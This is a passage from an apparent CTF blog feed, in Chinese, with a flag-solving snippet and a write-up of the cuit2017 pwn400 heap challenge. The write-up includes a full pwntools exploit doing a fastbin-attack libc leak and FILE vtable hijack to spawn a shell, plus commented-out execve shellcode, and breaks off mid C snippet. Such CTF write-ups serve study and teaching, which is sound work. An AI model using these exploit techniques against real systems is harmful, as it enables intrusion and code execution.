class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;135&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;119&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;192&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;206&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;73&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;92&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;174&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;130&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;164&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;95&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;153&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;254&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;163&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;206&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;51&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;204&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;180&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;196&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;106&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;63&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;252&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;202&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;153&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;193&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;146&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;88&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;118&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;214&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;168&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;68&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;68&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;245&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;144&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;102&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;207&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;154&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;65&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;131&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;185&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;27&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;162&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;214&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;63&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;238&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;248&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;38&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;129&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;170&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;180&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;181&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;96&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;165&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;121&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;214&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;193&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;94&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;83&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;41&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;169&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;120&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;178&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;217&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;93&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;74&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;217&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;89&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;164&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;228&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;175&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;164&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;176&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;94&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;232&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;47&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;111&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;153&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;119&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;85&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;147&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;130&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;248&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;235&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;178&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;50&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;49&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;39&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;215&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;188&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;101&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;172&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;88&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;83&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;215&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;204&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;226&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;118&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;156&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;142&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;87&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;152&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;54&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;239&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;49&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;220&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;216&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;143&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;112&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;217&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;114&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;150&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;51&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;198&lt;/span&gt;]]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;r = [&lt;span class=&quot;number&quot;&gt;325799&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;309234&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;317320&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;327895&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;298316&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;301249&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;330242&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;289290&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;273446&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;337687&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;258725&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;267444&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;373557&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;322237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;344478&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;362136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;331815&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;315157&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;299242&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;305418&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;313569&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;269307&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;338319&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;306491&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;351259&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;o = np.array(o)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;r = np.array(r)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;x = np.linalg.solve(o,r)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; x&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;string = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; x:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    string += chr(int(str(i)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;]))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; string&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】cuit2017 &amp; 0ctf2017 heap总结</title>
    <link href="https://winter3un.github.io/2017/06/04/heap-all/"/>
    <id>https://winter3un.github.io/2017/06/04/heap-all/</id>
    <published>2017-06-04T15:59:24.000Z</published>
    <updated>2017-06-04T16:15:22.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="涉及到的知识点"><a href="#涉及到的知识点" class="headerlink" title="涉及到的知识点"></a>涉及到的知识点</h3><p>1、fastbin attack</p><p>2、unsorted bin attack</p><p>3、malloc堆内存管理</p><a id="more"></a><h3 id="一些记录"><a href="#一些记录" class="headerlink" title="一些记录"></a>一些记录</h3><p>当我们用malloc申请一个0x20的空间的时候，glibc实际上给予了我们一个如下这样子的一个结构。</p><p>|head(0x8/0x10)|data(0x20)|</p><p><strong>注意：由于x84和x64的机器字长不一样，故其head头部大小也不一样，x86为0x8长度，x64为0x10长度。</strong></p><p>data区域是我们可以进行数据输入的区间，malloc返回的指针便是该区间的首地址，记作PTR</p><p>当我们free它的时候，它会判定是否与top chunk相邻，如果相邻，它将会与top chunk合并，如果不是的话，它会进一步判断自身大小是否满足fast bin的要求，fastbin的边界大小由 libc内的全局变量fast_max决定，不过x86下这个值为0x40，x64下位0x80，小于等于这个值的所有chunk，free后将有fast bin管理，如果该chunk可以重复free，我们则可以利用fast bin attack来实现<strong>有限制的地址写能力</strong>（<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c</a> ）。而如果边界的大小大于fastbin的边界大小，该chunk则会加入到unsorted bin中去，此时我们可以修改bk来实现unsorted attack （ <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c</a> ）如果free 一个small/large chunk 的时候，可以修改本chunk、前一个或后一个，small/large chunk的head and data，则可以进行double free攻击。（ <a href="http://www.hackdig.com/08/hack-25191.htm" target="_blank" rel="external">http://www.hackdig.com/08/hack-25191.htm</a>  ）</p><h3 id="cuit2017-pwn400"><a href="#cuit2017-pwn400" class="headerlink" title="cuit2017 pwn400"></a>cuit2017 pwn400</h3><p>题目可以从我github上下载。</p><p>hint：ubuntu 16.04</p><p>本题利用方式为：fast bin attack 覆盖name变量实现信息泄露。  overlap chunk attack 实现 hijack fsp attack，最终修改vtable至onegadget 或者system 实现get shell。</p><p>注意点：x64下面 0x220为vtable偏移量。x86么。。还没测ORZ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-05-27 21:28:47</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./pwn400"</span></div><div class="line">remote_ip = <span class="string">"119.29.87.226"</span></div><div class="line">port =  <span class="number">50004</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line">elf = ELF(target)</div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,sec)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(name)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(sec)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(sec)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(sec)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(data1,data2)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"Y"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(data1)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(data2)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(size,title,advise)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"6"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(size))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(title)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(advise)</div><div class="line"></div><div class="line"><span class="comment">#save(0x28,"a"*0x28+p64(0x21),"a"*0x18)</span></div><div class="line"></div><div class="line">add(<span class="string">"a"</span>*<span class="number">8</span>+p64(<span class="number">0x21</span>)+<span class="string">"\n"</span>,<span class="string">"1\n"</span>)</div><div class="line"></div><div class="line">dele()</div><div class="line">edit(str(<span class="number">0x6020c0</span>).rjust(<span class="number">7</span>,<span class="string">"0"</span>)+<span class="string">"\n"</span>)</div><div class="line">submit(<span class="string">"a"</span>*<span class="number">0x17</span>+<span class="string">"\x00\n"</span>,<span class="string">"a"</span>*<span class="number">0x8</span>+p64(elf.got[<span class="string">"alarm"</span>])+<span class="string">"\n"</span>)</div><div class="line"><span class="comment">##leak (- limit :(</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"9"</span>)</div><div class="line"></div><div class="line">alarm_addr = u64(ru(<span class="string">",You"</span>)[<span class="number">5</span>:<span class="number">-4</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">libc_base = alarm_addr-libc.symbols[<span class="string">"alarm"</span>]</div><div class="line">one_gadget = libc_base + <span class="number">0xf5e40</span></div><div class="line">bin_sh = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">system_addr = libc_base+libc.symbols[<span class="string">"system"</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">##hijack fsp</span></div><div class="line">save(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">0x28</span>+p64(<span class="number">0x110</span>+<span class="number">0x231</span>+<span class="number">0x1010</span>),<span class="string">"aaa\n"</span>)</div><div class="line">ru(<span class="string">"te on "</span>)</div><div class="line">addr_1 = int(ru(<span class="string">")\n"</span>)[<span class="number">2</span>:<span class="number">-2</span>],<span class="number">16</span>)</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(p,"b*0x040111A\nc")</span></div><div class="line">payload  = <span class="number">0x1c</span>*p64(system_addr)</div><div class="line">payload +=<span class="string">"/\x80||/////bin/sh\x00"</span> <span class="comment">#start fsp</span></div><div class="line">payload +=<span class="number">0x16</span>*p64(addr_1)+p64(<span class="number">0</span>)+(<span class="number">0x47</span><span class="number">-0x19</span>)*p64(addr_1)+p64(addr_1)+<span class="string">"\n"</span></div><div class="line"></div><div class="line">save(<span class="number">0x380</span>,p64(system_addr)*<span class="number">4</span>+<span class="string">"\n"</span>,payload)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>似乎有个可以直接用来算偏移的C源码，妈妈再也不用担心我算不准偏移啦~<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    FILE *fp;</div><div class="line">    fp=<span class="built_in">stderr</span>;</div><div class="line">    <span class="keyword">int</span> chain=&amp;(fp-&gt;_chain);</div><div class="line">    <span class="keyword">int</span> flags=&amp;(fp-&gt;_flags);</div><div class="line">    <span class="keyword">int</span> 